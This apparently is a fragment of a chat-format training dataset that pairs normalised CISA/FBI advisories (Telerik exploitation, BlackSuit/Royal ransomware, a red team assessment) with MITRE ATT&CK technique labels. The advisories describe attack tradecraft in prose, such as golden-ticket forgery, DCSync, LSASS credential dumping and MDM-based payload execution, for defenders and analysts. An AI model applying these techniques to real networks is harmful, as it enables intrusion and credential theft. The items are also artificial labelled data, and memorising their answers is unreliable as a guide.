systemscpg 51 implement patch management solution ensure compliance latest security patches patch management solution inventories software running addition vulnerability scanning recommended ensure vulnerability scanners configured scan comprehensive scope devices locations example noted technical details section victim organization appropriate plugin cve201918935 vulnerability went undetected due telerik ui software installed file path typically scanned identify unpatched instances software vulnerabilities organizations using vulnerability scanners aware installations may considered typical may require full file scans web applications note vulnerability scanners may limitations detecting vulnerabilities able identify windows installerinstalled applications case agencys vulnerability scanner telerik ui software installed via continuous integration ci continuous delivery cd pipeline rather windows installer highlights importance using comprehensive approach vulnerability scanning considers potential installation methods file paths validate output patch management vulnerability scanning solutions running services check discrepancies account services segment networks based function implement network segmentation separate network segments based role functionality proper network segmentation significantly reduces ability threat actor lateral movement controlling traffic flows betweenand access tovarious subnetworks see cisas layering network security segmentation infographic national security agencys segment networks deploy applicationaware defensescpg 81 isolate similar systems implement microsegmentation granular access policy restrictions modernize cybersecurity adopt zero trust principles network perimeter internal devices logical physical segmentation critical limiting preventing lateral movement privilege escalation exfiltration utilize access control lists acls hardened firewalls network monitoring devices regulate monitor audit crosssegment access data transfers best practice mitigation recommendations implement phishingresistant multifactor authentication mfa many services possibleparticularly webmail virtual private networks vpns accounts access critical systems privileged accounts manage backups mfa still leveraged secure access using jump serveran asset placed external internal networks serves intermediary accessto facilitate connections assets capability support mfa implementation additional guidance secure mfa configurations visit cisagovmfacpg 13 monitor analyze activity logs generated microsoft iis remote powershell collect access security focused logs idsidps firewall dlp vpn ensure logs securely stored specified duration informed risk pertinent regulatory guidancecpg 31 32 evaluate user permissions maintain separate user accounts actions activities associated administrator role eg business email web browsing etc privileges reevaluated recurring basis validate continued need given set permissionscpg 15 limit service accounts minimum permissions necessary run services cisa observed numerous error messages network logs indicative failed attempts write files additional directories move laterally maintain robust asset management policy comprehensive documentation assets tracking current version information maintain awareness outdated software mapping assets business critical functions determine need functionality assets require public internet exposurecpg 23 validate security controls addition applying mitigations cisa fbi msisac recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa cosealers recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 510 align security technologies selected technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security programincluding people processes technologiesbased data generated process cisa fbi msisac recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources unix timestamp converter references1 telerik exploiting net javascriptserializer deserialization cve2019189352 exploit database proofofconcept exploit cve201792483 acsc advisory 20200044 bishop fox cve201918935 remote code execution via insecure deserialization telerik ui5 volexity threat research xe group6 github proofofconcept exploit cve2019189357 microsoft configure logging iis8 github cve201918935 acknowledgements googles threat analysis group tag contributed csa product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016, T1036.005, T1055.001, T1059.006, T1070.004, T1083, T1095, T1105, T1140, T1190, T1505.003, T1583.003, T1595.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions organizations take today mitigate cyber threats related blacksuit ransomware activity prioritize remediating known exploited vulnerabilities train users recognize report phishing attempts enable enforce multifactor authentication summary note joint cybersecurity advisory part ongoingstopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visitstopransomwaregov see stopransomwareadvisories learn ransomware threats nocost resources note advisory originally published march 2 2023 updated four times november 13 2023the advisory updated share new royal ttps iocs august 7 2024 advisory updated notify network defenders rebrand royal ransomware actors blacksuit update includes new ttps iocs detection methods related blacksuit ransomware royal updated blacksuit throughout unless referring legacy royal activity updates new content noted august 14 2024 stix files previous update 08072024 refreshed august 27 2024 stix files 08192024 update refreshed new august 7 2024the federal bureau investigation fbi cybersecurity infrastructure security agency cisa releasing joint advisory disseminate known blacksuit ransomware iocs ttps identified fbi threat response activities thirdparty reporting recently july 2024 blacksuit ransomware evolution ransomware previously identified royal ransomware used approximately september 2022 june 2023 blacksuit shares numerous coding similarities royal ransomware exhibited improved capabilities updated august 7 2024 blacksuit conducts data exfiltration extortion prior encryption publishes victim data leak site ransom paid phishing emails among successful vectors initial access blacksuit threat actors gaining access victims networks blacksuit actors disable antivirus software exfiltrate large amounts data ultimately deploying ransomware encrypting systems updated august 7 2024 ransom demands typically ranged approximately 1 million 10 million usd payment demanded bitcoin blacksuit actors demanded 500 million usd total largest individual ransom demand 60 million blacksuit actors exhibited willingness negotiate payment amounts ransom amounts part initial ransom note require direct interaction threat actor via onion url reachable tor browser provided encryption recently uptick observed number instances victims received telephonic email communications blacksuit actors regarding compromise ransom blacksuit uses leak site publish victim data based nonpayment fbi cisa encourage organizations implement recommendations found mitigations section csa reduce likelihood impact ransomware incidents download pdf version report aa23061a stopransomware blacksuit royal ransomware pdf 66084 kb downloadable copy iocs see aa23061a stix xml mar 2023 xml 11426 kb aa23061a stix xml nov 2023 update xml 15294 kb aa23061a stix json nov 2023 update json 11396 kb aa23061a stix xml blacksuit xml 24282 kb aa23061a stix json blacksuit json 16262 kb technical details note advisory uses mitre attck enterprise framework version 15see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool initial access blacksuit uses unique partial encryption approach allows threat actor choose specific percentage data file encrypt approach allows actor lower encryption percentage larger files helps evade detection also significantly improves ransomware speed1 addition encrypting files blacksuit actors also engage double extortion tactics threaten publicly release exfiltrated data victim pay ransom blacksuit actors gain initial access victim networks several ways including phishing according thirdparty reporting blacksuit actors commonly gain initial access victim networks via phishing emails according open source reporting victims unknowingly installed malware delivers blacksuit ransomware receiving phishing emails containing malicious pdf documents malvertising2 remote desktop protocol rdpthe second common vector around 133 incidents blacksuit actors use initial access rdp compromise publicfacing applicationsfbi observed blacksuit actors gain initial access exploiting vulnerable publicfacing applications brokersreports trusted thirdparty sources indicate blacksuit actors may leverage initial access brokers gain initial access source traffic harvesting virtual private network vpn credentials stealer logs command control onceblacksuit actors gain access network communicate command control c2 infrastructure download multiple tools legitimate windows software repurposed byblacksuit actors strengthen foothold within victims network ransomware operators often use open source projects aid intrusion activities historically royal actors observed leveragingchisel secure shell sshclientputtyopenssh mobaxterm communicate c2 infrastructure lateral movement persistence updated august 7 2024 historically royal threat actors used rdp legitimate operating system os diagnostic tools move laterally across network blacksuit actors used rdp psexec well also use smb move laterally one confirmed case blacksuit actors useda legitimate admin account remotely log domain controller via smb domain controller threat actor deactivated antivirus software modifying group policy objects updated august 7 2024 fbi observed blacksuit actors using legitimate remote monitoring management rmm software maintain persistence victim networks new august 7 2024 blacksuit actors use systembc gootloader malware load additional tools maintain persistence discovery credential access new august 7 2024 blacksuit actors observed using sharpshares softperfect networx enumerate victim networks publicly available credential stealing tool mimikatz password harvesting tools nirsoft also found victim systems tools powertool gmer often used kill system processes exfiltration blacksuit actors exfiltrate data victim networks repurposing legitimate cyber penetration testing tools ascobalt strike malware toolsderivatives asursnifgozi data aggregation exfiltration according thirdparty reportingblacksuit actors first hop exfiltration operations usually us ip address new august 7 2024 blacksuit actors also use rclone brute ratel exfiltration encryption starting encryption process blacksuit actors use windows restart manager determine whether targeted files currently use blocked applications1 use windows volume shadow copy service vssadminexe delete shadow copies inhibit system recovery1 fbi found numerous batch bat files impacted systems typically transferred encrypted 7zip file batch files create new admin user force group policy update set pertinent registry keys autoextract execute ransomware monitor encryption process delete files upon completionincluding application system security event logs registry keys created modified deleted enable persistence victims system malicious files found victim networks following directories ctemp cusersuserappdataroaming cusersusers cprogramdata root c directory also served storage location malicious files blacksuit actors observed using legitimate software open source tools ransomware operations indicators compromise iocs see table 1 table 5 royal ransomware iocs obtained fbi threat response activities january 2023 new november 13 2023see table 6 table 7 royal blacksuit ransomware iocs june 2023 see table 8 list legitimate software used royal blacksuit threat actors identified fbi investigations june 2023 new august 7 2024 see table 9 throughtable 15 blacksuit ransomware iocs obtained fbi threat response activities july 2024 figure 1 sample ransom note disclaimer observed ip addresses several years old fbi cisa recommend vetting investigating ip addresses prior taking forwardlooking action blocking royal iocs january 2023 royal blacksuit iocs june 2023 new november 13 2023 blacksuit threat actors observed using legitimate software open source tools ransomware operations threat actors observed using open source network tunneling tools chisel cloudflared well secure shell ssh client openssh mobaxterm establish ssh connections publicly available credential stealing tool mimikatz password harvesting tools nirsoft also found victim systems legitimate rmm tools also observed backdoor access vectors legitimate software open source tools found table 8 iocs july 2024 new august 7 2024 disclaimer several observed ip addresses first observed early 2023 although recent july 2024 historically linked blacksuit formerly known royal ransomware ip addresses advisory maliciously used time range highlighted may used legitimate purposes outside time span fbi cisa recommend ip addresses investigated vetted organizations prior taking action blocking ransom note new august 7 2024 figure 1shows observed blacksuit ransom notes delivered victims mitre attck tactics techniques see table 18 table 23for referenced threat actor tactics techniques advisory well corresponding detection andor mitigation recommendations additional mitigations see mitigations section detection methods new august 7 2024 please reference yara rule aid detecting blacksuit activity notethe yara rule derived fbi investigations guaranteed detect confirmed malicious activity mitigations network defenders fbi cisa recommend network defenders implement mitigations improve organizations cybersecurity posture based blacksuit actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisascrosssector cybersecurity performance goals information cpgs including additional recommended baseline protections implement recovery planto maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year note nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software keep operating systems software firmware datecpg 1e timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systems require phishingresistant multifactor authentication administrator accountscpg 2h require standard mfa services extent possible particularly webmail virtual private networks accounts access critical systems segment networkscpg 2f prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring toolcpg 3a aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts implement secure logging collection storage practicescpg 2t learn logging best practices referencingcisas logging made easy resources review domain controllers servers workstations active directories new andor unrecognized accounts audit user accountswith administrative privileges configure access controls according principle least privilege disable unused ports implement enforce email security policiescpg 2m disable macros defaultcpg 2n consider adding email banner emails received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task disable commandline scripting activities permissionsprivilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally maintain offline backups data regularly maintain backup restorationcpg 2rby instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure software manufacturers mitigations apply enterprises critical infrastructure organizations onpremises hybrid environments recognizing insecure software root cause majority flaws responsibility end user cisa urges software manufacturers implement following reduce prevalence identified exploited issues egmisconfigurations weak passwords weaknesses identified exploited assessment team embed security product architecture throughout entire software development lifecycle sdlc mandate mfa ideally phishingresistant mfa privileged users make mfa default rather optin feature mitigations align tactics provided joint guide shifting balance cybersecurity risk principles approaches secure design software cisa urges software manufacturers take ownership improving security outcomes customers applying secure design tactics using secure design tactics software manufacturers make product lines secure box without requiring customers spend additional resources making configuration changes purchasing security software logs monitoring making routine updates information secure design see cisas secure design webpage validate security controls addition applying mitigations fbi cisa recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory seetable 18 table 23 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guidenote joint ransomware guide provides preparation prevention mitigation best practices well ransomware response checklist nocost cyber hygiene servicescyber hygiene services andransomware readiness assessment reporting organization obligation respond provide information back fbi response joint csa reviewing information provided organization decides provide information fbi reporting must consistent applicable state federal laws fbi interested information shared include boundary logs showing communication foreign ip addresses sample ransom note communications blacksuit actors bitcoin wallet information decryptor files andor benign sample encrypted file additional details interest include targeted company point contact status scope infection estimated loss operational impact transaction ids date infection date detected initial attack vector host networkbased indicators fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbis internet crime complain center ic3 local fbi field office cisa via agencys incident reporting system 247 operations center saycisacisadhsgov calling 1844saycisa 18447292472 disclaimer organization obligation respond provide information response product reviewing information provided organization decides provide information authoring agencies must consistent applicable state federal law information report provided informational purposes fbi cisa endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa acknowledgements dfir report contributed advisory version history january 31 2023 initial release royal ransomwarenovember 13 2023 first update royal ransomwareaugust 7 2024 updated title royal ransomware blacksuit ransomware updates noted throughoutaugust 14 2024 updated stix filesaugust 19 2024 updated stix filesaugust 27 2024 updated stix files product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1021.001, T1070.001, T1078, T1078.002, T1105, T1119, T1133, T1190, T1484.001, T1486, T1562.001, T1566, T1566.001, T1566.002, T1572"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today harden local environment establish security baseline normal network activity tune network hostbased appliances detect anomalous behavior conduct regular assessments ensure appropriate procedures created followed security staff end users enforce phishingresistant mfa greatest extent possible summary cybersecurity infrastructure security agency cisa releasing cybersecurity advisory csa detailing activity key findings recent cisa red team assessmentin coordination assessed organizationto provide network defenders recommendations improving organizations cyber posture 2022 cisa conducted red team assessment rta request large critical infrastructure organization multiple geographically separated sites team gained persistent access organizations network moved laterally across organizations multiple geographically separated sites eventually gained access systems adjacent organizations sensitive business systems sbss multifactor authentication mfa prompts prevented team achieving access one sbs team unable complete viable plan compromise second sbss within assessment period despite mature cyber posture organization detect red teams activity throughout assessment including team attempted trigger security response cisa releasing csa detailing red teams tactics techniques procedures ttps key findings provide network defenders critical infrastructure organizations proactive steps reduce threat similar activity malicious cyber actors csa highlights importance collecting monitoring logs unusual activity well continuous testing exercises ensure organizations environment vulnerable compromise regardless maturity cyber posture cisa encourages critical infrastructure organizations apply recommendations mitigations section csaincluding conduct regular testing within security operations centerto ensure security processes procedures date effective enable timely detection mitigation malicious activity download pdf version report cisa red team shares key findings improve monitoring hardening networks pdf 106 mb technical details note advisory uses mitre attck enterprise framework version 12 see appendix table red teams activity mapped mitre attck tactics techniques introduction cisa authority upon request provide analyses expertise technical assistance critical infrastructure owners operators provide operational timely technical assistance federal nonfederal entities respect cybersecurity risks see generally 6 usc 652c5 659c6 receiving request red team assessment rta organization coordinating highlevel details engagement certain personnel organization cisa conducted rta threemonth period 2022 rtas cisa red team emulates cyber threat actors assess organizations cyber detection response capabilities phase red team attempts gain maintain persistent access organizations enterprise network avoiding detection evading defenses phase ii red team attempts trigger security response organizations people processes technology victim assessment large organization multiple geographically separated sites throughout united states assessment red teams goal phase gain access certain sensitive business systems sbss phase red team cyber threat activity overview organizations network segmented logical geographical boundaries cisas red team gained initial access two organization workstations separate sites via spearphishing emails gaining access leveraging active directory ad data team gained persistent access third host via spearphishing emails host team moved laterally misconfigured server compromised domain controller dc used forged credentials move multiple hosts across different sites environment eventually gained root access workstations connected organizations mobile device management mdm server team used root access move laterally sbsconnected workstations however multifactor authentication mfa prompt prevented team achieving access one sbs phase ended team could implement seemingly viable plan achieve access second sbs initial access active directory discovery cisa red team gained initial access two workstations geographically separated sites site 1 site 2 via spearphishing emails team first conducted opensource research identify potential targets spearphishing specifically team looked email addresses well names could used derive email addresses based teams identification email naming scheme red team sent tailored spearphishing emails seven targets using commercially available email platforms team used logging tracking features one platforms analyze organizations email filtering defenses confirm emails reached targets inbox team built rapport targeted individuals emails eventually leading individuals accept virtual meeting invite meeting invite took red teamcontrolled domain button clicked downloaded malicious iso file download another button appeared clicked executed file two seven targets responded phishing attempt giving red team access workstation site 1 workstation 1 workstation site 2 workstation 1 team leveraged modified sharphound collector ldapsearch commandline tool dsquery query scrape ad information including ad users computers groups access control lists acls organizational units ou group policy objects gpos note sharphound bloodhound collector opensource ad reconnaissance tool bloodhound multiple collectors assist information querying 52 hosts ad unconstrained delegation enabled lastlogon timestamp within 30 days query hosts unconstrained delegation enabled store kerberos ticketgranting tickets tgts users authenticated host many hosts including site 1 sharepoint server windows server 2012r2 default configuration windows server 2012r2 allows unprivileged users query group membership local administrator groups red team queried parsed bloodhound data members sharepoint admin group identified several standard user accounts administrative access team initiated second spearphishing campaign similar first target users one user triggered red teams payload led installation persistent beacon users workstation workstation 2 giving team persistent access workstation 2 lateral movement credential access persistence red team moved laterally workstation 2 site 1 sharepoint server system level access site 1 sharepoint server unconstrained delegation enabled used access obtain cached credentials loggedin usersincluding new technology local area network manager ntlm hash sharepoint server account obtain credentials team took snapshot lsassexe tool called nanodump exported output processed output offline mimikatz team exploited unconstrained delegation misconfiguration steal dcs tgt ran dfscoerce python script dfscoercepy prompted dc authentication sharepoint server using servers ntlm hash team deployed rubeus capture incoming dc tgt dfscoerce abuses microsofts distributed file systemmsdfsnm protocol relay authentication arbitrary server1 team used tgt harvest advanced encryption standard aes256 hashes via dcsync krbtgt account several privileged accountsincluding domain admins workstation admins system center configuration management sccm service account sccm account 1 team used krbtgt account hash throughout rest assessment perform golden ticket attacks forged legitimate tgts team also used asktgt command impersonate accounts credentials requesting account tgts team first impersonated sccm account 1 moved laterally site 1 sccm distribution point dp server sccm server 1 direct network access workstation 2 team moved sccm server 1 central sccm server sccm server 2 third site site 3 specifically team queried ad using lightweight directory access protocol ldap information networks sites subnets query revealed organization sites subnets broken classless interdomain routing cidr subnet description used ldap queries domain name system dns requests identify recently active hosts listed existing network connections sccm server 1 revealed active server message block smb connection sccm server 2 attempted move laterally sccm server 2 via appdomain hijacking https beacon failed call back attempted move laterally smb beacon successful team also moved sccm server 1 site 1 workstation workstation 3 housed active server administrator team impersonated administrative service account via golden ticket attack sccm server 1 account administrative privileges workstation 3 user employed keepass password manager team able use obtain passwords internal websites kernelbased virtual machine kvm server virtual private network vpn endpoints firewalls another keepass database credentials server administrator relied password manager stored credentials database file red team pulled decryption key memory using keethief used unlock database organizations request red team confirmed sccm server 2 provided access organizations sites firewall rules allowed smb traffic sccm servers sites team moved laterally sccm server 2 sccm dp server site 5 sccm server 1 hosts two sites sites 4 6 team installed persistent beacons sites site 5 broken private public subnet dcs able cross boundary move subnets team moved dcs specifically team moved site 5 sccm dp server public dc moved public dc private dc team able move private dc workstations private subnet team leveraged access available sccm 2 move around organizations network postexploitation activities see postexploitation activity section see figure 1 timeline red teams initial access lateral movement showing key access points figure 1 red team cyber threat activity initial access lateral movement traversing network team varied lateral movement techniques evade detection organization nonuniform firewalls sites within sites within sites firewalls configured subnet teams primary methods move sites appdomainmanager hijacking dynamiclink library dll hijacking instances used windows management instrumentation wmi event subscriptions team impersonated several accounts evade detection moving possible team remotely enumerated local administrators group target hosts find valid user account technique relies anonymous smb pipe binds disabled default starting windows server 2016 cases team attempted determine valid accounts based group name purpose team previously acquired credentials used asktgt impersonate account team credentials used golden ticket attack forge account postexploitation activity gaining access sbss persistent deep access established across organizations networks subnetworks red team began postexploitation activities attempted access sbss trusted agents organization tasked team gaining access two specialized servers sbs 1 sbs 2 team achieved root access three sbsadjacent workstations unable move laterally sbs servers phase ended team could implement plan move sbs 1 mfa prompt blocked team moving sbs 2 phase ended could implement potential workarounds however team assesses using secure shell ssh session socket files see could accessed hosts available users whose workstations compromised plan potential access sbs 1 conducting opensource research1591001 team identified sbs 1 2 assets associated managementupkeep staff located sites 5 6 respectively adding previously collected ad data discovery team able identify specific sbs 1 admin account team planned use organizations mobile device management mdm software move laterally sbs 1 administrators workstation pivot sbs 1 assets team identified organizations mdm vendor using opensource ad information moved laterally mdm distribution point server site 5 mdm dp 1 server contained backups mdm mysql database drive backup directory backups included encryption key needed decrypt encrypted values ssh passwords database backup identified user sbs 1 administrator account user 2 users workstation workstation 4 mdm software remotely administered team moved laterally mdm server mdm 1 site 3 searched files server found plaintext credentials application programming interface api user account stored powershell scripts team attempted leverage credentials browse web login page mdm vendor unable website directed organizationcontrolled singlesign sso authentication page team gained root access workstations connected mdm 1specifically team accessed workstation 4by selecting mdm user plaintext credentials powershell scripts mdm 1 mdm mysql database elevating selected mdm users account privileges administrator privileges modifying users account adding create policy delete policy permissions creating policy via mdm api instructed workstation 4 download execute payload give team interactive access root workstation verifying interactive access resetting permissions back original state removing policy via mdm api removing create policy delete policy administrator permissions mdm users account interacting workstation 4 team found open ssh socket file corresponding netstat connection host team identified bastion host architecture documentation found workstation 4 team planned move workstation 4 bastion host sbs 1 note ssh socket file allows user open multiple ssh sessions single already authenticated ssh connection without additional authentication team could take advantage open ssh socket instead searched sbs 1 architecture diagrams documentation workstation 4 found security operations secops network diagram detailing network boundaries site 5 secops onpremises systems site 5 nonsecops onpremises systems site 5 secops cloud infrastructure documentation listed secops cloud infrastructure ip ranges trusted ip addresses public 16 subnet team able request public ip range cloud provider workstation 4 made successful outbound ssh connections cloud infrastructure team intended use connection reverse tunnel traffic back workstation access bastion host via open ssh socket file however phase 1 ended able implement plan attempts access sbs 2 conducting opensource research team identified organizational branch likely access sbs 2 team queried ad identify branchs users administrators team gathered list potential accounts identified administrators systems admin data systems administrator technical roles using access mdm mysql database team queried potential targets 1 determine targets last contact time mdm 2 ensure policy targeting targets workstation would run relatively quickly using methodology described steps plan potential access sbs 1 section team gained interactive root access two site 6 sbs 2connected workstations software engineering workstation workstation 5 user administrator workstation workstation 6 workstation 5 user bash history files appeared ssh passwords mistyped bash prompt saved bash history team attempted authenticate sbs 2 using similar tunnel setup described access sbs 1 section potential credentials users bash history file however attempt unsuccessful unknown reasons workstation 6 team found txt file containing plaintext credentials user using pattern discovered credentials team able crack users workstation account password team also discovered potential passwords ssh connection commands users bash history using similar tunnel setup described team attempted log sbs 2 however prompt mfa passcode blocked attempt see figure 2 timeline teams post exploitation activity includes key points access figure 2 red team cyber threat activity post exploitation command control team used thirdparty owned operated infrastructure services throughout assessment including certain cases command control c2 included cobalt strike merlin payloads c2 throughout assessment note merlin postexploit tool leverages http protocols c2 traffic team maintained multiple cobalt strike servers hosted cloud vendor configured server different domain used servers communication compromised hosts servers retained assessment data two commercially available cloudcomputing platforms team used platforms create flexible dynamic redirect servers send traffic teams cobalt strike servers redirecting servers make difficult defenders attribute assessment activities backend team servers redirectors used https reverse proxies redirect c2 traffic target organizations network cobalt strike team servers team encrypted data transit using encryption keys stored teams cobalt strike servers cloud service rapidly change ip address teams redirecting servers event detection eradication content delivery network cdn services obfuscate teams c2 traffic technique leverages cdns associated highreputation domains malicious traffic appears directed towards reputation domain actually redirected red teamcontrolled cobalt strike servers team used domain fronting disguise outbound traffic order diversify domains persistent beacons communicating technique also leverages cdns allows beacon appear connect thirdparty domains nytimescom actually connecting teams redirect server phase ii red team measurable events activity red team executed 13 measurable events designed provoke response people processes technology defending organizations network see table 1 description events expected network defender activity organizations actual response findings key issues red team noted following key issues relevant security organizations network findings contributed teams ability gain persistent undetected access across organizations sites see mitigations section recommendations mitigate issues insufficient host network monitoring red teams phase ii actions failed provoke response people processes technology defending organizations network organization failed detect lateral movement persistence c2 activity via intrusion detection prevention systems endpoint protection platform web proxy logs windows event logs additionally throughout phase team received deconflictions confirmation organization caught activity list higher risk activities conducted team opportunities detection phishing lateral movement reuse generation use golden ticket anomalous ldap traffic anomalous internal share enumeration unconstrained delegation server compromise dcsync anomalous account usage lateral movement anomalous outbound network traffic anomalous outbound ssh connections teams cloud servers workstations lack monitoring endpoint management systems team used organizations mdm system gain root access machines across organizations network without detected endpoint management systems provide elevated access thousands hosts treated high value assets hvas additional restrictions monitoring krbtgt never changed site 1 krbtgt account password updated decade krbtgt account domain default account acts service account key distribution center kdc service used encrypt sign kerberos tickets domain compromise krbtgt account could provide adversaries ability sign tgts facilitating domain access years date compromise red team able use krbtgt account forge tgts multiple accounts throughout phase excessive permissions standard users team discovered several standard user accounts local administrator access critical servers misconfiguration allowed team use lowlevel access phished user move laterally unconstrained delegation host compromise entire domain hosts unconstrained delegation enabled unnecessarily hosts unconstrained delegation enabled store kerberos tgts users authenticate host enabling actors steal service tickets compromise krbtgt accounts perform golden ticket silver ticket attacks team performed ntlmrelay attack obtain dcs tgt followed golden ticket attack sharepoint server unconstrained delegation gain ability impersonate site 1 ad account use nonsecure default configurations organization used default configurations hosts windows server 2012 r2 default configuration allows unprivileged users query group membership local administrator groups red team used identified several standard user accounts administrative access windows server 2012 r2 sharepoint server additional issues team noted following additional issues ineffective separation privileged accounts workstations allowed unprivileged accounts local administrator access example red team discovered ordinary user account local admin group sharepoint server user administrative access compromised actor access servers without needing elevate privileges administrative user accounts separated designated admin accounts exclusively used admin purposes lack server egress control servers including domain controllers allowed unrestricted egress traffic internet inconsistent host configuration team observed inconsistencies servers workstations within domain including inconsistent membership local administrator group among different servers workstations example workstations server admins domain admins local administrators workstations neither potentially unwanted programs team noticed potentially unusual software including music software installed workstations servers extraneous software installations indicate inconsistent host configuration see increase attack surfaces malicious actors gain initial access escalate privileges network mandatory password changes enabled assessment team keylogged user mandatory password change noticed final character password modified potentially due domain passwords required changed every 60 days smart card use inconsistent across domain technology deployed applied uniformly significant portion users without smartcard protections enabled team used unprotected accounts throughout assessment move laterally domain gain persistence noted strengths red team noted following technical controls defensive measures prevented hampered offensive actions organization conducts regular proactive penetration tests adversarial assessments invests hardening network based findings team unable discover easily exploitable services ports web interfaces three million external inscope ips forced team resort phishing gain initial access environment service account passwords strong team unable crack hashes obtained 610 service accounts pulled critical strength slowed team moving around network initial parts phase team discover useful credentials open file shares file servers slowed progress team moving around network mfa used sbss team blocked moving sbs 2 mfa prompt strong security controls segmentation sbs systems direct access sbs located separate networks admins sbs used workstations protected local firewalls mitigations cisa recommends organizations implement recommendations table 2 mitigate issues listed findings section advisory mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures see cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections additionally cisa recommends organizations implement mitigations improve cybersecurity posture provide users regular training exercises specifically related phishing emailscpg 43 phishing accounts majority initial access intrusion events enforce phishingresistant mfa greatest extent possiblecpg 13 reduce risk credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally also forces kerberos aes authentication opposed weaker rc4 ntlm implement credential guard windows 10 server 2016 refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa refrain storing plaintext credentials scriptscpg 34 red team discovered powershell script containing plaintext credentials allowed escalate admin upgrade windows server 2019 greater windows 10 greater versions security features included older operating systems longterm effort cisa recommends organizations prioritize implementing modern zero trust network architecture leverages secure cloud services key enterprise security capabilities eg identity access management endpoint detection response policy enforcement upgrades applications infrastructure leverage modern identity management network access practices centralizes streamlines access cybersecurity data drive analytics identifying managing cybersecurity risks invests technology personnel achieve goals cisa encourages organizational leadership ask executive leadership question organization accept business risk implementing critical security controls mfa risks nature typically acknowledged prioritized senior levels organization validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 3 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources see cisas redeye tool cisas github page redeye interactive opensource analytic tool used visualize report red team command control activities see cisas redeye tool overview video information references1 bleeping computer new dfscoerce ntlm relay attack allows windows domain takeover appendix mitre attck tactics techniques see tables referenced red team tactics techniques advisory note activity phase unless noted product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1016, T1018, T1021.002, T1033, T1046, T1048, T1049, T1069.002, T1071, T1071.001, T1071.002, T1078.002, T1087.002, T1090.002, T1098, T1105, T1106, T1110.002, T1136.001, T1136.002, T1204, T1482, T1531, T1543.003, T1548, T1550.002, T1552, T1552.001, T1557.001, T1558.001, T1558.003, T1566.002, T1573, T1583, T1585.002, T1588.002, T1589.002, T1615"}]}
